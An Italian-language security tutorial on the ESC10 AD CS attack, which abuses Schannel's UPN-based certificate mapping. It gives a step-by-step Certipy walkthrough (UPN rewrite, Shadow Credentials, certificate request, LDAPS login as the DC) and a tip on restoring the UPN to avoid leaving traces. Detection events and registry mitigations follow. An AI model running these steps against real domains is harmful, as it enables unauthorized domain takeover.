---
title: 'ESC10 AD CS: PrivEsc, Weak Certificate Mapping in Schannel'
slug: esc10-adcs
description: 'ESC10 AD CS sfrutta il weak certificate mapping di Schannel per la privilege escalation via LDAPS. Guida con Certipy, UPN manipulation, detection e mitigazioni.'
image: /10.webp
draft: false
date: 2026-03-09T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - esc
  - certipy
---

# ESC10 in Active Directory Certificate Services: weak certificate mapping su Schannel

ESC10 è una tecnica di **privilege escalation via AD CS** che sfrutta un **weak certificate mapping in Schannel**, il componente Windows che gestisce l'autenticazione TLS su servizi come **LDAPS** e **IIS HTTPS**.

A differenza di **ESC9** (che sfrutta l'assenza della SID security extension) o del classico attacco Kerberos/PKINIT, qui il problema non sta nel certificato in sé, ma in **come il Domain Controller decide a quale account associare quel certificato** quando l'autenticazione passa per Schannel invece che per Kerberos.

Prima di entrare nel dettaglio, un glossario per chi arriva da fuori:

| Termine                   | Cos'è, in una riga                                                                                                                                                                                                             |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Schannel**              | Il componente Windows che gestisce TLS/SSL, usato da LDAPS, IIS HTTPS e altri servizi che si autenticano con un certificato invece che con una password.                                                                       |
| **Certificate mapping**   | Il processo con cui il DC decide "a quale account AD corrisponde questo certificato" durante l'autenticazione.                                                                                                                 |
| **Weak / Strong mapping** | Weak = il mapping si basa solo su un campo del certificato (es. UPN), facile da manipolare. Strong = si basa sul SID incorporato nel certificato, molto più difficile da falsificare.                                          |
| **GenericWrite**          | Un permesso AD che ti lascia modificare quasi tutti gli attributi di un oggetto (incluso l'UPN) senza esserne il proprietario.                                                                                                 |
| **Shadow Credentials**    | Tecnica che aggiunge una chiave pubblica all'attributo `msDS-KeyCredentialLink` di un account, permettendo di generare un certificato e ottenerne le credenziali (hash/TGT) senza conoscerne la password.                      |
| **ccache**                | Il file in cui vengono salvate le credenziali Kerberos (il TGT) ottenute, da riusare in comandi successivi.                                                                                                                    |
| **KRB5CCNAME**            | La variabile d'ambiente che dice ai tool di autenticazione Kerberos quale file ccache usare.                                                                                                                                   |
| **LDAP Shell**            | Una sessione interattiva autenticata via LDAPS, non una shell di sistema: permette query e modifiche LDAP (utenti, gruppi, delega), non eseguire comandi sulla macchina.                                                       |
| **RBCD**                  | Resource-Based Constrained Delegation: una delega che permette a un account di autenticarsi *per conto di* un altro verso una risorsa specifica — spesso usata in post-exploitation per prendere il controllo di una macchina. |

***

# In cosa consiste il problema

Il mapping di Schannel è governato da una chiave di registro sul DC:

```text
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods
```

Se questo valore include il flag **0x4 (UPN mapping)**, Schannel può associare un certificato a un account **guardando solo l'UPN scritto nel certificato**, ignorando il SID presente nella security extension. Questo è il punto debole: l'UPN di un account è un attributo che chiunque abbia **GenericWrite** su quell'account può modificare liberamente, anche solo per qualche secondo.

L'idea dell'attacco: prendi un account qualsiasi su cui hai GenericWrite, gli cambi temporaneamente l'UPN per farlo "sembrare" un altro account (tipicamente un account macchina come il Domain Controller, perché di default non ha un UPN proprio), richiedi un certificato con quell'UPN, e lo usi per autenticarti come se fossi l'account bersaglio.

> Nota: con "ESC10" in letteratura si indicano in realtà due varianti distinte — questa basata su Schannel/UPN mapping, e una basata su un mapping Kerberos debole. Questa guida copre solo la prima.

***

# Identificazione ESC10

Certipy **non rileva ESC10 automaticamente**, perché richiede accesso al registro dei Domain Controller, non alla sola enumerazione LDAP.

Va controllato manualmente il valore:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods
```

Valori vulnerabili (bit 0x4 presente):

```text
0x4
0xC
0x1C
0x1F
```

Configurazione sicura raccomandata:

```text
0x18
```

***

# Exploitation ESC10

Prerequisiti:

* un permesso che ti lasci scrivere `userPrincipalName` su un account che non è l'obiettivo finale (chiamiamolo "victim") — **GenericWrite** è l'esempio più comune, ma basta anche un `WriteProperty` mirato su quel singolo attributo
* enrollment rights su un template con EKU **Client Authentication** (il template `User` usato sotto è un esempio, non una garanzia: deve essere effettivamente pubblicato e richiedibile dal contesto che userai)
* il DC target con **UPN mapping attivo** (flag 0x4)
* un modo per operare come `victim` al momento della richiesta del certificato — avere GenericWrite sul suo UPN non ti dà automaticamente le sue credenziali. Shadow Credentials (Step 3) è **un** modo per ottenerle, non l'unico né un passaggio sempre obbligatorio se le hai già

L'obiettivo dell'esempio è impersonare il **Domain Controller**, perché gli account macchina di default non hanno un UPN proprio — quindi il mapping "basato solo su UPN" li rende un bersaglio comodo.

***

## Step 1 — Leggere l'UPN attuale della vittima

Prima di modificare l'UPN, salvalo: andrà ripristinato a fine attacco.

```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```

Output:

```
userPrincipalName : victim@CORP.LOCAL
```

***

## Step 2 — Riscrivere temporaneamente l'UPN

```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'dc$@corp.local' \
-user 'victim' update
```

Da questo momento, agli occhi di un mapping basato su UPN, l'account `victim` **sembra** essere `DC$`. Questo funziona grazie al permesso GenericWrite ottenuto in precedenza — non serve nessun altro privilegio.

***

## Step 3 — Ottenere le credenziali della vittima (se non le hai già)

Se non conosci la password di `victim`, puoi comunque operare su di esso con Shadow Credentials:

```bash
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```

Output:

```
Saving credential cache to victim.ccache
```

Certipy aggiunge una chiave al `msDS-KeyCredentialLink` dell'account, genera un certificato al volo e lo usa per ottenere un ticket Kerberos (TGT) per `victim`, salvato nel file `.ccache`.

***

## Step 4 — Richiedere il certificato con l'identità rubata

```bash
export KRB5CCNAME=victim.ccache
```

```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```

Il flag `-k` dice a Certipy di autenticarsi con Kerberos usando il ccache puntato da `KRB5CCNAME`, invece che con utente/password. La CA quindi emette un certificato per l'identità attuale di `victim` — cioè, dopo lo Step 2, per `dc$@corp.local`.

Output:

```
Got certificate with UPN 'dc$@corp.local'
Certificate object SID is 'S-1-5-21-...-1108'
Saving certificate to dc.pfx
```

Il certificato contiene quindi un disallineamento voluto:

```
UPN = dc$@corp.local      → identità "dichiarata"
SID = victim (S-1-5-21-...-1108)  → identità reale del titolare
```

***

## Step 5 — Ripristinare l'UPN originale

Fondamentale per non rompere l'account e non lasciare tracce evidenti:

```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```

Il certificato ottenuto allo Step 4 **resta valido con l'UPN falso** anche dopo questo ripristino: l'UPN su AD e l'UPN scritto dentro il certificato (SAN UPN) sono due cose diverse. Il certificato è già stato emesso e firmato con `dc$@corp.local` incorporato; cambiare l'attributo in AD non lo modifica retroattivamente. Per questo l'ordine degli step conta: puoi "rimettere tutto a posto" su AD e usare comunque il certificato dopo.

***

## Step 6 — Autenticarsi via LDAPS con l'identità rubata

```bash
certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

Output:

```
Authenticated to '10.0.0.100' as: 'u:CORP\DC$'
```

Questo è il cuore della vulnerabilità: anche se il certificato porta il **SID reale di victim**, Schannel con UPN mapping attivo guarda solo il campo UPN e autentica l'attaccante come **DC$**, ignorando il SID. L'attaccante ora ha una sessione LDAP con i privilegi del Domain Controller.

***

# Possibili abusi post-exploitation

Una volta autenticato come DC via LDAP shell:

* configurare **Resource-Based Constrained Delegation** (`set_rbcd`) per autenticarsi su altre macchine come utenti privilegiati;
* fare dump di oggetti LDAP sensibili (`dump`, `search`);
* da lì, escalation verso **Domain Admin** completo.

***

# Detection ESC10

Da controllare:

* il valore `CertificateMappingMethods` su tutti i DC, non solo su uno;
* autenticazioni **LDAPS basate su certificato** fuori dal pattern abituale (host, orario, volume);
* modifiche sospette all'attributo **UPN**, specialmente se un account "normale" assume per breve tempo un UPN che somiglia a un account macchina o privilegiato.

Indicatori concreti:

* certificati emessi con UPN di account privilegiati o macchina ma SID di un account diverso;
* autenticazioni TLS/LDAPS da host che normalmente non fanno quel tipo di richiesta.

Eventi utili da correlare (se l'auditing è configurato e i log vengono raccolti — non scontato di default):

| Evento | Dove             | Cosa indica                                                                                |
| ------ | ---------------- | ------------------------------------------------------------------------------------------ |
| `5136` | Active Directory | Modifica a un attributo di un oggetto — utile per beccare il cambio di `userPrincipalName` |
| `4886` | CA               | Richiesta di certificato ricevuta                                                          |
| `4887` | CA               | Certificato approvato ed emesso                                                            |

***

# Troubleshooting

Se l'attacco non funziona, le cause più comuni sono:

* `CertificateMappingMethods` non include il bit `0x4` — allora non è questa variante di ESC10;
* l'account target ha già un UPN che genera un conflitto con quello che stai per impostare;
* l'account "victim" non ha enrollment rights sul template usato per la richiesta;
* il certificato viene emesso ma l'autenticazione LDAPS fallisce comunque — spesso per catena di trust del certificato non valida lato DC, non per il mapping in sé.

Un dettaglio da non dare per scontato: ottenere una sessione LDAP come `DC$` **non** equivale ad avere una shell di sistema sul Domain Controller né a essere automaticamente Domain Admin — sei autenticato con quei privilegi LDAP, quello che ci fai dipende dai permessi effettivi disponibili da lì (es. RBCD).

***

# Mitigation ESC10

Configurazione sicura per Schannel:

```text
CertificateMappingMethods = 0x18
```

Questo valore forza il mapping basato su validazione forte (SID), eliminando la componente "solo UPN". È la mitigazione diretta per la variante Schannel descritta in questa guida.

> Non serve (e da settembre 2025 non ha più senso) impostare manualmente `StrongCertificateBindingEnforcement = 2`: quella chiave riguardava il mapping Kerberos, non Schannel, e dagli aggiornamenti di sicurezza di settembre 2025 l'enforcement forte è comunque permanente e non più disattivabile via registro. Non confonderla con la mitigazione di questa pagina.

In generale: tieni i DC aggiornati con le patch correnti e verifica `CertificateMappingMethods` su **tutti** i sistemi che accettano autenticazione client via Schannel, non solo sui DC.

***

# FAQ — ESC10 ADCS

### Cos'è ESC10?

Una vulnerabilità dovuta a un **weak certificate mapping in Schannel**, che permette di autenticarsi con l'identità sbagliata se l'UPN del certificato non corrisponde al suo reale titolare (SID).

### ESC10 riguarda Kerberos?

No. Il percorso descritto qui riguarda **Schannel** (LDAPS, IIS HTTPS). Kerberos/PKINIT ha un proprio meccanismo di enforcement separato, ormai permanente dagli aggiornamenti di sicurezza di settembre 2025.

### ESC10 richiede AD CS?

Sì, serve comunque ottenere un certificato client authentication valido: la vulnerabilità sta nel mapping successivo, non nell'emissione del certificato in sé.

### Qual è la differenza tra ESC9 e ESC10?

[ESC9](https://hackita.it/articoli/esc9-adcs/) sfrutta certificati emessi **senza** la SID security extension. ESC10 riguarda invece **come Schannel interpreta** quell'estensione (o la ignora) durante il mapping.

***

ESC10 è una delle tecniche più "silenziose" di abuso dei certificati in AD, perché non tocca il template né la CA: lavora tutto sul mapping lato DC. Per il quadro completo delle escalation AD CS vedi la [guida ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

Tool usato in questa guida: [Certipy](https://github.com/ly4k/Certipy).
